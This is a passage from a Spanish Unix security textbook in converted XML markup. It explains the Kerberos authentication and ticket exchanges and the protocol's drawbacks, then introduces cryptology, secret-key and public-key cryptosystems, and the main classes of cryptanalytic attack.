credenciales necesarias para acceder a otros servicios. Para ello cuando un usuario conecta a un sistema
Unix &#x2018;kerberizado&#x2019; teclea en primer lugar su nombre de usuario, de la misma forma que en un sistema
habitual; la diferencia est&#x00E1; en que el programa login env&#x02CA;&#x0131;a el nombre de usuario al servidor de autenticaci&#x00F3;n
de Kerberos para solicitar un ticket que le permita comunicarse posteriormente con el servidor de tickets,
TGS:
</para><section role="center"><title/>
<!--l. 150--><para> <informalequation><graphic 
fileref="unixsec335x.gif"></graphic></informalequation></para></section>
<!--l. 153--><para>Si el usuario es conocido, el servidor de autenticaci&#x00F3;n retorna un mensaje que contiene una clave para la
comunicaci&#x00F3;n con TGS y un timestamp cifrado con la clave secreta del cliente, junto un ticket para la
comunicaci&#x00F3;n con TGS cifrado con la clave secreta de este servidor:
</para><section role="center"><title/>
<!--l. 158--><para> <informalequation><graphic 
fileref="unixsec336x.gif"></graphic></informalequation></para></section>
<!--l. 161--><para>El programa de login intentar&#x00E1; descifrar <informalequation><graphic 
fileref="unixsec337x.gif"></graphic></informalequation>, con la clave que el usuario proporciona, y si
&#x00E9;sta es correcta podr&#x00E1; obtener <informalequation><graphic 
fileref="unixsec338x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec339x.gif"></graphic></informalequation>: un cliente s&#x00F3;lo podr&#x00E1; descifrar esta parte del mensaje
si conoce su clave secreta, <informalequation><graphic 
fileref="unixsec340x.gif"></graphic></informalequation> (en este caso el password). Una vez obtenida <informalequation><graphic 
fileref="unixsec341x.gif"></graphic></informalequation>, la clave
para comunicar al cliente con el servidor de tickets, el programa passwd la guarda para una
posterior comunicaci&#x00F3;n con el TGS y borra la clave del usuario de memoria, ya que el ticket ser&#x00E1;
su&#xFB01;ciente para autenticar al cliente; este modelo consigue que el password nunca viaje por la
red.
  </para></section><!--end subsection--><!--l. 171--><section 
role="subsection"><title><abbrev role="title-mark">19.3.2</abbrev><anchor 
   id="x1-30000019.3.2"  ></anchor>Obtenci&#x00F3;n de tickets</title>
<!--l. 172--><para>  El cliente ya posee una clave de sesi&#x00F3;n para comunicarse con el servidor de tickets y el ticket necesario
para hacerlo, cifrado con la clave secreta de este servidor (el cliente no puede descifrar este ticket).
Cuando el cliente necesita acceder a un determinado servicio es necesario que disponga de
un ticket para hacerlo, por lo que lo solicita al TGS envi&#x00E1;ndole un autenticador que el propio
cliente genera, el ticket de T y el nombre del servicio al que desea acceder, S, y un indicador de
tiempo:
</para><section role="center"><title/>
<!--l. 180--><para> <informalequation><graphic 
fileref="unixsec342x.gif"></graphic></informalequation></para></section>
<!--l. 183--><para>Cuando TGS recibe el ticket comprueba su validez y si todo es correcto retorna un mensaje que contiene una
clave para comunicaci&#x00F3;n con S y un timestamp cifrado con la clave de sesi&#x00F3;n del par CT, junto a un ticket
para que el cliente C y el servidor S se puedan comunicar cifrado con la clave secreta del
servidor:
</para><section role="center"><title/>
<!--l. 188--><para> <informalequation><graphic 
fileref="unixsec343x.gif"></graphic></informalequation></para></section>
<!--l. 191--><para>C s&#x00F3;lo podr&#x00E1; obtener <informalequation><graphic 
fileref="unixsec344x.gif"></graphic></informalequation> si conoce la clave secreta, <informalequation><graphic 
fileref="unixsec345x.gif"></graphic></informalequation>.
  </para></section><!--end subsection--><!--l. 192--><section 
role="subsection"><title><abbrev role="title-mark">19.3.3</abbrev><anchor 
   id="x1-30100019.3.3"  ></anchor>Petici&#x00F3;n de servicio</title>
<!--l. 193--><para>  Tras obtener el ticket para comunicarse con S el cliente ya est&#x00E1; preparado para solicitar el servicio; para
ello presenta la credencial autenticada ante el servidor &#xFB01;nal, que es quien va a prestar el servicio. C se
comporta de la misma forma que cuando solicit&#x00F3; un ticket a T: env&#x02CA;&#x0131;a a S el autenticador reci&#x00E9;n
generado, el ticket y una petici&#x00F3;n que puede ir cifrada si el servidor lo requiere, aunque no es
necesario:

</para><section role="center"><title/>
<!--l. 200--><para> <informalequation><graphic 
fileref="unixsec346x.gif"></graphic></informalequation></para></section>
<!--l. 204--><para>El servidor env&#x02CA;&#x0131;a entonces al cliente la prueba de actualidad cifrada con la clave secreta de la
sesi&#x00F3;n:
</para><section role="center"><title/>
<!--l. 206--><para> <informalequation><graphic 
fileref="unixsec347x.gif"></graphic></informalequation></para></section>
<!--l. 209--><para>S&#x00F3;lo S pudo obtener <informalequation><graphic 
fileref="unixsec348x.gif"></graphic></informalequation> y por tanto enviar este mensaje.
</para><figure><title/><blockquote> <section role="center"><title/>
 <!--l. 217--><para>
 heightwidthdepthkerby.png                                                           <graphic width="430.0pt" fileref="kerby.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-3010011"  ></anchor>Figura&#x00A0;19.1</title><para>Protocolo de autenticaci&#x00F3;n Kerberos.</para></blockquote>
  </blockquote></figure>
  </section><!--end subsection--></section><!--end section--><!--l. 221--><section 
role="section"><title><abbrev role="title-mark">19.4</abbrev><anchor 
   id="x1-30200019.4"  ></anchor>Problemas de Kerberos</title>
<!--l. 222--><para>  A la vista de todo lo comentado en los puntos anteriores puede darnos la impresi&#x00F3;n de que Kerberos es la
panacea de los sistemas de autenticaci&#x00F3;n. Sin embargo, y aunque se trate de un sistema robusto, no est&#x00E1;
exento de ciertos problemas, tanto de seguridad como de implementaci&#x00F3;n, que han hecho que este sistema
no est&#x00E9; todo lo extendido que deber&#x02CA;&#x0131;a.
<!--br/-->
<!--br/-->Uno de los principales problemas de Kerberos es que cualquier programa que lo utilice ha de ser
modi&#xFB01;cado para poder funcionar correctamente, siguiendo un proceso denominado &#x2018;kerberizaci&#x00F3;n&#x2019;. Esto
implica obviamente que se ha de disponer del c&#x00F3;digo fuente de cada aplicaci&#x00F3;n que se desee kerberizar, y
tambi&#x00E9;n supone una inversi&#x00F3;n de tiempo considerable para algunas aplicaciones m&#x00E1;s o menos complejas que
no todas las organizaciones se pueden permitir.
<!--br/-->
<!--br/-->El problema anterior es simplemente de implementaci&#x00F3;n; no afecta para nada a la seguridad &#x2013; o
inseguridad &#x2013; del protocolo. Un problema que s&#x02CA;&#x0131; est&#x00E1; relacionado con la seguridad de Kerberos es la
gran centralizaci&#x00F3;n que presenta el sistema. Para un correcto funcionamiento se ha de disponer
en todo momento del servidor Kerberos, de forma que si la m&#x00E1;quina que lo alberga falla, la
red se convierte en inutilizable; obviamente esto es una contradicci&#x00F3;n con lo que nos dice la
teor&#x02CA;&#x0131;a de sistemas distribuidos, donde se recalca el uso de la distribuci&#x00F3;n para mantener la
disponibilidad del sistema, intentado que si un equipo falla el resto pueda seguir funcionando, si no a
pleno rendimiento, al menos correctamente. Por si esto no fuera su&#xFB01;ciente, otro ejemplo de la
centralizaci&#x00F3;n de Kerberos reside en el hecho de que casi toda la seguridad reside en el servidor que
mantiene la base de datos de claves, de forma que si &#x00E9;ste se ve comprometido, la red entera est&#x00E1;
amenazada.
<!--br/-->
<!--br/-->Otro potencial problema de seguridad es el uso de timestamps como pruebas de frescura en Kerberos. Esto
obliga a que todas las m&#x00E1;quinas que ejecutan servicios autenticados mantengan sus relojes
m&#x02CA;&#x0131;nimamente sincronizados (con desfases m&#x00E1;ximos de pocos minutos), con todo lo que esto
implica. Adem&#x00E1;s ese tiempo global ha de ser accesible a todas las estaciones; aunque en el dise~no
no se asume que todas mantengan la hora exacta, s&#x02CA;&#x0131; que se les obliga a mantenerse dentro
de los m&#x00E1;rgenes si desean solicitar tickets, para lo que se necesitan servidores de tiempo con
los que los clientes puedan sincronizar peri&#x00F3;dicamente sus relojes, por ejemplo cada vez que
arrancan.

<!--br/-->
<!--br/-->Todos estos problemas, y algunos m&#x00E1;s (<citation>[?]</citation>) que se han ido solucionando en diferentes versiones del sistema,
han propiciado que el uso de Kerberos no est&#x00E9; muy extendido; en la mayor&#x02CA;&#x0131;a de redes es su&#xFB01;ciente con un
protocolo de comunicaci&#x00F3;n cifrado para mantener una m&#x02CA;&#x0131;nima seguridad, de forma que el complejo modelo
de Kerberos se ve sustituido a ese efecto por programas tan simples y transparentes como
SSH.



</para><!--l. 1--><para>

</para><!--l. 1--><para>

</para><!--l. 1--><para>

  </para></section><!--end section--><!--l. 1--><section 
role="part"><title><anchor 
   id="x1-303000V"  ></anchor>Otros aspectos de la seguridad</title>

<!--l. 119--><para>


</para><!--l. 1--><para>

  </para></section><!--end part--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-30400020"  ></anchor>Criptolog&#x02CA;&#x0131;a</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">20.1</abbrev><anchor 
   id="x1-30500020.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  En el mundo real, si una universidad quiere proteger los expedientes de sus alumnos los guardar&#x00E1; en un
armario ign&#x02CA;&#x0131;fugo, bajo llave y vigilado por guardias, para que s&#x00F3;lo las personas autorizadas puedan acceder
a ellos para leerlos o modi&#xFB01;carlos; si queremos proteger nuestra correspondencia de curiosos,
simplemente usamos un sobre; si no queremos que nos roben dinero, lo guardamos en una caja
fuerte&#x2026;Lamentablemente, en una red no disponemos de todas estas medidas que nos parecen habituales: la
principal (podr&#x02CA;&#x0131;amos decir &#x00FA;nica) forma de protecci&#x00F3;n va a venir de la mano de la criptograf&#x02CA;&#x0131;a. El cifrado de
los datos nos va a permitir desde proteger nuestro correo personal para que ning&#x00FA;n curioso lo pueda leer,
hasta controlar el acceso a nuestros archivos de forma que s&#x00F3;lo personas autorizadas puedan examinar
(o lo que quiz&#x00E1;s es m&#x00E1;s importante, modi&#xFB01;car) su contenido, pasando por proteger nuestras
claves cuando conectamos a un sistema remoto o nuestros datos bancarios cuando realizamos
una compra a trav&#x00E9;s de Internet. Hemos presentado con anterioridad algunas aplicaciones que
utilizan de una u otra forma la criptograf&#x02CA;&#x0131;a para proteger nuestra informaci&#x00F3;n; aqu&#x02CA;&#x0131; intentaremos
dar unas bases te&#x00F3;ricas m&#x02CA;&#x0131;nimas sobre t&#x00E9;rminos, algoritmos, funciones&#x2026;utilizadas en ese tipo de
aplicaciones. Para m&#x00E1;s referencias es imprescindible la obra <citation>[?]</citation>; otras publicaciones interesantes son
<citation>[?]</citation>, <citation>[?]</citation>, <citation>[?]</citation> y, para temas de criptoan&#x00E1;lisis, <citation>[?]</citation>. Un texto b&#x00E1;sico para aquellos que no disponen
de mucho tiempo o que s&#x00F3;lo necesitan una perspectiva general de la criptograf&#x02CA;&#x0131;a puede ser
<citation>[?]</citation>.
<!--br/-->
<!--br/-->La criptolog&#x02CA;&#x0131;a (del griego krypto y logos, estudio de lo oculto, lo escondido) es la
ciencia <anchor 
   id="x1-305001f1"  ></anchor><footnote><para>     Hemos de dejar patente que la criptolog&#x02CA;&#x0131;a es una ciencia, aunque en muchos lugares a&#x00FA;n se la considera un arte; por
ejemplo, en el Diccionario de la Real Academia de la Lengua Espa~nola.</para></footnote>
que trata los problemas te&#x00F3;ricos relacionados con la seguridad en el intercambio de mensajes en clave entre
un emisor y un receptor a trav&#x00E9;s de un canal de comunicaciones (en t&#x00E9;rminos inform&#x00E1;ticos, ese canal suele ser
una red de computadoras). Esta ciencia est&#x00E1; dividida en dos grandes ramas: la criptograf&#x02CA;&#x0131;a, ocupada del
cifrado de mensajes en clave y del dise~no de criptosistemas (hablaremos de &#x00E9;stos m&#x00E1;s adelante), y el
criptoan&#x00E1;lisis, que trata de descifrar los mensajes en clave, rompiendo as&#x02CA;&#x0131; el criptosistema. En lo sucesivo
nos centraremos m&#x00E1;s en la criptograf&#x02CA;&#x0131;a y los criptosistemas que en el criptoan&#x00E1;lisis, ya que nos interesa,
m&#x00E1;s que romper sistemas de cifrado (lo cual es bastante complicado cuando trabajamos con
criptosistemas serios), el saber c&#x00F3;mo funcionan &#x00E9;stos y conocer el dise~no elemental de algunos sistemas
seguros.
<!--br/-->
<!--br/-->La criptograf&#x02CA;&#x0131;a es una de las ciencias consideradas como m&#x00E1;s antiguas, ya que sus or&#x02CA;&#x0131;genes se remontan al
nacimiento de nuestra civilizaci&#x00F3;n. Su uso original era el proteger la con&#xFB01;dencialidad de informaciones
militares y pol&#x02CA;&#x0131;ticas, pero en la actualidad es una ciencia interesante no s&#x00F3;lo en esos c&#x02CA;&#x0131;rculos cerrados, sino
para cualquiera que est&#x00E9; interesado en la con&#xFB01;dencialidad de unos determinados datos: actualmente existe
multitud de software y hardware destinado a analizar y monitorizar el tr&#x00E1;&#xFB01;co de datos en redes de
computadoras; si bien estas herramientas constituyen un avance en t&#x00E9;cnicas de seguridad y protecci&#x00F3;n, su
uso indebido es al mismo tiempo un grave problema y una enorme fuente de ataques a la intimidad de los
usuarios y a la integridad de los propios sistemas. Aunque el objetivo original de la criptograf&#x02CA;&#x0131;a era
mantener en secreto un mensaje, en la actualidad no se persigue &#x00FA;nicamente la privacidad o
con&#xFB01;dencialidad de los datos, sino que se busca adem&#x00E1;s garantizar la autenticidad de los mismos (el
emisor del mensaje es quien dice ser, y no otro), su integridad (el mensaje que leemos es el
mismo que nos enviaron) y su no repudio (el emisor no puede negar el haber enviado el
mensaje).
<!--br/-->
<!--br/-->Podemos dividir la historia de la criptograf&#x02CA;&#x0131;a en tres periodos fundamentales; hasta mediados de siglo,
tenemos la criptolog&#x02CA;&#x0131;a precient&#x02CA;&#x0131;&#xFB01;ca, considerada no una ciencia sino m&#x00E1;s bien un arte. En 1949, Shannon
logr&#x00F3; cimentar la criptograf&#x02CA;&#x0131;a sobre unas bases matem&#x00E1;ticas (<citation>[?]</citation>), comenzando el per&#x02CA;&#x0131;odo de la criptograf&#x02CA;&#x0131;a
cient&#x02CA;&#x0131;&#xFB01;ca. Poco m&#x00E1;s de diez a~nos despu&#x00E9;s se comenz&#x00F3; a estudiar la posibilidad de una comunicaci&#x00F3;n secreta
sin que ambas partes conocieran una clave com&#x00FA;n (hasta ese momento la existencia de dicha
clave era la base de toda la seguridad en el intercambio de informaci&#x00F3;n), de forma que esos
estudios dieron lugar a diversos art&#x02CA;&#x0131;culos sobre el tema durante la d&#x00E9;cada de los setenta (<citation>[?]</citation>, <citation>[?]</citation>,
<citation>[?]</citation>, <citation>[?]</citation>&#x2026;). Finalmente, en 1976 Di&#xFB03;e y Hellman publicaron sus trabajos sobre criptograf&#x02CA;&#x0131;a de
clave p&#x00FA;blica (<citation>[?]</citation>), dando lugar al per&#x02CA;&#x0131;odo de criptograf&#x02CA;&#x0131;a de clave p&#x00FA;blica, que dura hasta la

actualidad.
  </para></section><!--end section--><!--l. 80--><section 
role="section"><title><abbrev role="title-mark">20.2</abbrev><anchor 
   id="x1-30600020.2"  ></anchor>Criptosistemas</title>
<!--l. 81--><para>  Matem&#x00E1;ticamente, podemos de&#xFB01;nir un criptosistema como una cuaterna de elementos {<informalequation><graphic 
fileref="unixsec350x.gif"></graphic></informalequation>},
formada por:
     </para><itemizedlist>
     <listitem>
     <!--l. 84--><para>Un  conjunto  &#xFB01;nito  llamado  alfabeto,  <informalequation><graphic 
fileref="unixsec351x.gif"></graphic></informalequation>,  a  partir  del  cual,  y  utilizando  ciertas  normas
     sint&#x00E1;cticas y sem&#x00E1;nticas, podremos emitir un mensaje en claro (plain text) u obtener el texto en
     claro correspondiente a un mensaje cifrado (cipher text). Frecuentemente, este alfabeto es el
     conjunto de los enteros m&#x00F3;dulo <informalequation><graphic 
fileref="unixsec352x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec353x.gif"></graphic></informalequation>, para un <informalequation><graphic 
fileref="unixsec354x.gif"></graphic></informalequation> dado.
     </para></listitem>
     <listitem>
     <!--l. 90--><para>Otro conjunto &#xFB01;nito denominado espacio de claves, <informalequation><graphic 
fileref="unixsec355x.gif"></graphic></informalequation>, formado por todas las posibles claves,
     tanto de cifrado como de descifrado, del criptosistema.
     </para></listitem>
     <listitem>
     <!--l. 93--><para>Una familia de aplicaciones del alfabeto en s&#x02CA;&#x0131; mismo, <informalequation><graphic 
fileref="unixsec356x.gif"></graphic></informalequation>, llamadas transformaciones de
     cifrado. El proceso de cifrado se suele representar como
     </para><section role="center"><title/>
     <!--l. 96--><para> <informalequation><graphic 
fileref="unixsec357x.gif"></graphic></informalequation></para></section>
     <!--l. 99--><para>donde <informalequation><graphic 
fileref="unixsec358x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec359x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec360x.gif"></graphic></informalequation>.
     </para></listitem>
     <listitem>
     <!--l. 100--><para>Otra familia de aplicaciones del alfabeto en s&#x02CA;&#x0131; mismo, <informalequation><graphic 
fileref="unixsec361x.gif"></graphic></informalequation>, llamadas transformaciones de
     descifrado. An&#x00E1;logamente al proceso de cifrado, el de descifrado se representa como
     </para><section role="center"><title/>
     <!--l. 103--><para> <informalequation><graphic 
fileref="unixsec362x.gif"></graphic></informalequation>,</para></section>
     <!--l. 106--><para>donde <informalequation><graphic 
fileref="unixsec363x.gif"></graphic></informalequation>, <informalequation><graphic 
fileref="unixsec364x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec365x.gif"></graphic></informalequation>.</para></listitem></itemizedlist>
<!--l. 108--><para>Muchos autores dividen a su vez un miembro de esta cuaterna, el alfabeto, en dos espacios diferentes: el
espacio de mensajes, <informalequation><graphic 
fileref="unixsec366x.gif"></graphic></informalequation>, formado por los textos en claro que se pueden formar con el alfabeto, y el espacio
de cifrados, <informalequation><graphic 
fileref="unixsec367x.gif"></graphic></informalequation>, formado por todos los posibles criptogramas que el cifrador es capaz de producir. Sin
embargo, lo habitual es que tanto el texto en claro como el cifrado pertenecezcan al alfabeto, por lo que
hemos preferido no hacer distinciones entre uno y otro, agrup&#x00E1;ndolos en el conjunto <informalequation><graphic 
fileref="unixsec368x.gif"></graphic></informalequation> para simpli&#xFB01;car los
conceptos que presentamos. As&#x02CA;&#x0131;, un criptosistema presenta la estructura mostrada en la &#xFB01;gura
<ulink 
  url="#x1-3060011"  ><!--ref: crypsys--></ulink>.
<!--br/--></para><figure><title/><blockquote>
<section role="center"><title/>

<!--l. 118--><para>          _________________________________ 
                                                   _________________________________ 
                               _______________________________-
                                                                        ___-
                    6
                                                              6
     ___-
               <informalequation><graphic 
fileref="unixsec369x.gif"></graphic></informalequation>(k,a)                               <informalequation><graphic 
fileref="unixsec370x.gif"></graphic></informalequation>(k&#x02CA;
                    k                                        k&#x02CA;            aac
</para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-3060011"  ></anchor>Figura&#x00A0;20.1</title><para>Estructura de un criptosistema</para></blockquote>
  </blockquote></figure>
<!--br/-->El emisor emite un texto en claro, que es tratado por un cifrador con la ayuda de una cierta clave, <informalequation><graphic 
fileref="unixsec371x.gif"></graphic></informalequation>,
creando un texto cifrado (criptograma). Este criptograma llega al descifrador a trav&#x00E9;s de un canal de
comunicaciones (como hemos dicho antes, para nosotros este canal ser&#x00E1; habitualmente alg&#x00FA;n tipo
de red), y este convierte el criptograma de nuevo en texto claro, apoy&#x00E1;ndose ahora en otra
clave, <informalequation><graphic 
fileref="unixsec372x.gif"></graphic></informalequation> (veremos m&#x00E1;s adelante que esta clave puede o no ser la misma que la utilizada para
cifrar).Este texto claro ha de coincidir con el emitido inicialmente para que se cumplan los
principios b&#x00E1;sicos de la criptograf&#x02CA;&#x0131;a moderna: en este hecho radica toda la importancia de los
criptosistemas.
<!--br/-->
<!--br/-->Es obvio, a la vista de lo expuesto anteriormente, que el elemento m&#x00E1;s importante de todo el
criptosistema es el cifrador, que ha de utilizar el algoritmo de cifrado para convertir el texto claro en
un criptograma. Usualmente, para hacer esto, el cifrador depende de un par&#x00E1;metro exterior,
llamado clave de cifrado (o de descifrado, si hablamos del descifrador) que es aplicado a una
funci&#x00F3;n matem&#x00E1;tica irreversible (al menos, computacionalmente): no es posible invertir la funci&#x00F3;n a
no ser que se disponga de la clave de descifrado. De esta forma, cualquier conocedor de la
clave (y, por supuesto, de la funci&#x00F3;n), ser&#x00E1; capaz de descifrar el criptograma, y nadie que no
conozca dicha clave puede ser capaz del descifrado, a&#x00FA;n en el caso de que se conozca la funci&#x00F3;n
utilizada.
  </section><!--end section--><!--l. 172--><section 
role="section"><title><abbrev role="title-mark">20.3</abbrev><anchor 
   id="x1-30700020.3"  ></anchor>Clasi&#xFB01;caci&#x00F3;n de los criptosistemas</title>
<!--l. 173--><para>  La gran clasi&#xFB01;caci&#x00F3;n de los criptosistemas se hace en funci&#x00F3;n de la disponibilidad de la clave de
cifrado/descifrado. Existen, por tanto, dos grandes grupos de criptosistemas:
  </para><!--l. 176--><section 
role="subsection"><title><abbrev role="title-mark">20.3.1</abbrev><anchor 
   id="x1-30800020.3.1"  ></anchor>Criptosistemas de clave secreta</title>
<!--l. 177--><para>  Denominamos criptosistema de clave secreta (de clave privada, de clave &#x00FA;nica o sim&#x00E9;trico) a aquel
criptosistema en el que la clave de cifrado, <informalequation><graphic 
fileref="unixsec373x.gif"></graphic></informalequation>, puede ser calculada a partir de la de descifrado, <informalequation><graphic 
fileref="unixsec374x.gif"></graphic></informalequation>, y
viceversa. En la mayor&#x02CA;&#x0131;a de estos sistemas, ambas claves coinciden, y por supuesto han de mantenerse
como un secreto entre emisor y receptor: si un atacante descubre la clave utilizada en la comunicaci&#x00F3;n, ha
roto el criptosistema.
<!--br/-->
<!--br/-->Hasta la d&#x00E9;cada de los setenta, la invulnerabilidad de todos los sistemas depend&#x02CA;&#x0131;a de este mantenimiento en
secreto de la clave de cifrado. Este hecho presentaba una gran desventaja: hab&#x02CA;&#x0131;a que enviar, aparte del
criptograma, la clave de cifrado del emisor al receptor, para que &#x00E9;ste fuera capaz de descifrar el mensaje.
Por tanto, se incurr&#x02CA;&#x0131;a en los mismos peligros al enviar la clave, por un sistema que hab&#x02CA;&#x0131;a de ser
supuestamente seguro, que al enviar el texto plano. De todos los sistemas de clave secreta, el &#x00FA;nico que se
utiliza en la actualidad es DES (Data Encryption Standard, que veremos m&#x00E1;s adelante); otros
algoritmos de clave privada, como el cifrado Caesar o el criptosistema de Vigen&#x00E8;re (ser&#x00E1;n
tambi&#x00E9;n brevemente comentados m&#x00E1;s adelante) han sido criptoanalizados con &#x00E9;xito, lo cual da una

idea del porqu&#x00E9; del desuso en que han ca&#x02CA;&#x0131;do estos sistemas (con la excepci&#x00F3;n de DES, que es
seguramente el algoritmo de cifra m&#x00E1;s utilizado en la actualidad). Por si esto no fuera su&#xFB01;ciente,
el hecho de que exista al menos una clave de cifrado/descifrado entre cada dos usuarios de
un sistema har&#x02CA;&#x0131;a inviable la existencia de criptosistemas sim&#x00E9;tricos en las grandes redes de
computadores de hoy en d&#x02CA;&#x0131;a: para un sistema de computaci&#x00F3;n con <informalequation><graphic 
fileref="unixsec375x.gif"></graphic></informalequation> usuarios, se precisar&#x02CA;&#x0131;an <informalequation><graphic 
fileref="unixsec376x.gif"></graphic></informalequation>
claves diferentes, lo cual es obviamente imposible en grandes sistemas. Todos estos motivos han
propiciado que el estudio de los cifradores sim&#x00E9;tricos (excepto DES) quede relegado a un papel
hist&#x00F3;rico.
<!--br/-->
<!--br/-->Los sistemas de cifrado de clave &#x00FA;nica se dividen a su vez en dos grandes grupos de criptosistemas: por una
parte tenemos los cifradores de &#xFB02;ujo, que son aquellos que pueden cifrar un s&#x00F3;lo bit de texto claro al
mismo tiempo, y por tanto su cifrado se produce bit a bit, y por otro lado tenemos los cifradores de
bloque, que cifran un bloque de bits (habitualmente, cada bloque es de 64 bits) como una &#x00FA;nica
unidad.
</para><!--l. 213--><para>
  </para></section><!--end subsection--><!--l. 213--><section 
role="subsection"><title><abbrev role="title-mark">20.3.2</abbrev><anchor 
   id="x1-30900020.3.2"  ></anchor>Criptosistemas de clave p&#x00FA;blica</title>
<!--l. 214--><para>  Como hemos dicho en la introducci&#x00F3;n, en 1976, Whit&#xFB01;eld Di&#xFB03;e y Martin Hellman, de la Universidad de
Stanford, demostraron la posibilidad de construir criptosistemas que no precisaran de la transferencia de
una clave secreta en su trabajo <citation>[?]</citation>. Esto motiv&#x00F3; multitud de investigaciones y discusiones sobre la
criptograf&#x02CA;&#x0131;a de clave p&#x00FA;blica y su impacto, hasta el punto que la NSA (National Security Agency)
estadounidense trat&#x00F3; de controlar el desarrollo de la criptograf&#x02CA;&#x0131;a, ya que la consideraban una amenaza
peligrosa para la seguridad nacional. Esta pol&#x00E9;mica ha llegado incluso hasta nuestros d&#x02CA;&#x0131;as, en los que el
a&#xFB00;aire Zimmermann (el autor de PGP) o el Clipper Chip han llenado portadas de peri&#x00F3;dicos de todo el
mundo.
<!--br/-->
<!--br/-->Veamos ahora en que se basan los criptosistemas de clave p&#x00FA;blica. En &#x00E9;stos, la clave de cifrado se hace de
conocimiento general (se le llama clave p&#x00FA;blica). Sin embargo, no ocurre lo mismo con la clave de
descifrado (clave privada), que se ha de mantener en secreto. Ambas claves no son independientes, pero
del conocimiento de la p&#x00FA;blica no es posible deducir la privada sin ning&#x00FA;n otro dato (recordemos que en los
sistemas de clave privada suced&#x02CA;&#x0131;a lo contrario). Tenemos pues un par clave p&#x00FA;blica-clave privada; la
existencia de ambas claves diferentes, para cifrar o descifrar, hace que tambi&#x00E9;n se conozca a estos
criptosistemas como asim&#x00E9;tricos.
<!--br/-->
<!--br/-->Cuando un receptor desea recibir una informaci&#x00F3;n cifrada, ha de hacer llegar a todos los potenciales
emisores su clave p&#x00FA;blica, para que estos cifren los mensajes con dicha clave. De este modo, el &#x00FA;nico que podr&#x00E1;
descifrar el mensaje ser&#x00E1; el leg&#x02CA;&#x0131;timo receptor, mediante su clave privada. Matem&#x00E1;ticamente, si <informalequation><graphic 
fileref="unixsec377x.gif"></graphic></informalequation> es el
algoritmo cifrador y <informalequation><graphic 
fileref="unixsec378x.gif"></graphic></informalequation> el descifrador, se ha de cumplir que
</para><section role="center"><title/>
<!--l. 241--><para><informalequation><graphic 
fileref="unixsec379x.gif"></graphic></informalequation>,</para></section>
<!--l. 243--><para>representando <informalequation><graphic 
fileref="unixsec380x.gif"></graphic></informalequation> un mensaje, y siendo <informalequation><graphic 
fileref="unixsec381x.gif"></graphic></informalequation> y <informalequation><graphic 
fileref="unixsec382x.gif"></graphic></informalequation> las claves de descifrado y cifrado, respectivamente.
  </para></section><!--end subsection--></section><!--end section--><!--l. 245--><section 
role="section"><title><abbrev role="title-mark">20.4</abbrev><anchor 
   id="x1-31000020.4"  ></anchor>Criptoan&#x00E1;lisis</title>
<!--l. 246--><para>  El criptoan&#x00E1;lisis es la ciencia opuesta a la criptograf&#x02CA;&#x0131;a (quiz&#x00E1;s no es muy afortunado hablar de ciencias
opuestas, sino m&#x00E1;s bien de ciencias complementarias), ya que si &#x00E9;sta trata principalmente de crear
y analizar criptosistemas seguros, la primera intenta romper esos sistemas, demostrando su
vulnerabilidad: dicho de otra forma, trata de descifrar los criptogramas. El t&#x00E9;rmino descifrar siempre va
acompa~nado de discusiones de car&#x00E1;cter t&#x00E9;cnico, aunque asumiremos que descifrar es conseguir el
texto en claro a partir de un criptograma, sin entrar en pol&#x00E9;micas de reversibilidad y solidez de
criptosistemas.
<!--br/-->
<!--br/-->En el an&#x00E1;lisis para establecer las posibles debilidades de un sistema de cifrado, se han de asumir las

denominadas condiciones del peor caso: (1) el criptoanalista tiene acceso completo al algoritmo de
encriptaci&#x00F3;n, (2) el criptoanalista tiene una cantidad considerable de texto cifrado, y (3) el criptoanalista
conoce el texto en claro de parte de ese texto cifrado. Tambi&#x00E9;n se asume generalmente el Principio de
Kerckho&#xFB00;s, que establece que la seguridad del cifrado ha de residir exclusivamente en el secreto de la
clave, y no en el mecanismo de cifrado.
<!--br/-->
<!--br/-->Aunque para validar la robustez de un criptosistema normalmente se suponen todas las condiciones del
peor caso, existen ataques m&#x00E1;s espec&#x02CA;&#x0131;&#xFB01;cos, en los que no se cumplen todas estas condiciones. Cuando el
m&#x00E9;todo de ataque consiste simplemente en probar todas y cada una de las posibles claves del espacio de
claves hasta encontrar la correcta, nos encontramos ante un ataque de fuerza bruta o ataque exhaustivo.
Si el atacante conoce el algoritmo de cifrado y s&#x00F3;lo tiene acceso al criptograma, se plantea un ataque s&#x00F3;lo al
criptograma; un caso m&#x00E1;s favorable para el criptoanalista se produce cuando el ataque cumple todas las
condiciones del peor caso; en este caso, el criptoan&#x00E1;lisis se denomina de texto en claro conocido. Si
adem&#x00E1;s el atacante puede cifrar una cantidad indeterminada de texto en claro al ataque se le denomina
de texto en claro escogido; este es el caso habitual de los ataques contra el sistema de
veri&#xFB01;caci&#x00F3;n de usuarios utilizado por Unix, donde un intruso consigue la tabla de contrase~nas
(generalmente /etc/passwd) y se limita a realizar cifrados de textos en claro de su elecci&#x00F3;n y a
comparar los resultados con las claves cifradas (a este ataque tambi&#x00E9;n se le llama de diccionario,
debido a que el atacante suele utilizar un &#xFB01;chero &#x2018;diccionario&#x2019; con los textos en claro que va a
utilizar). El caso m&#x00E1;s favorable para un analista se produce cuando puede obtener el texto en claro
correspondiente a criptogramas de su elecci&#x00F3;n; en este caso el ataque se denomina de texto cifrado
escogido.
<!--br/-->
<!--br/-->Cualquier algoritmo de cifrado, para ser considerado seguro, ha de soportar todos estos ataques y otros no
citados; sin embargo, en la criptograf&#x02CA;&#x0131;a, como en cualquier aspecto de la seguridad, inform&#x00E1;tica o no, no
debemos olvidar un factor muy importante: las personas. El sistema m&#x00E1;s robusto caer&#x00E1; f&#x00E1;cilmente si se
tortura al emisor o al receptor hasta que desvelen el contenido del mensaje, o si se le ofrece a uno de ellos
una gran cantidad de dinero; este tipo de ataques (sobornos, amenazas, extorsi&#x00F3;n, tortura&#x2026;) se consideran
siempre los m&#x00E1;s efectivos.
<!--br/-->
  </para></section><!--end section--><!--l. 298--><section 
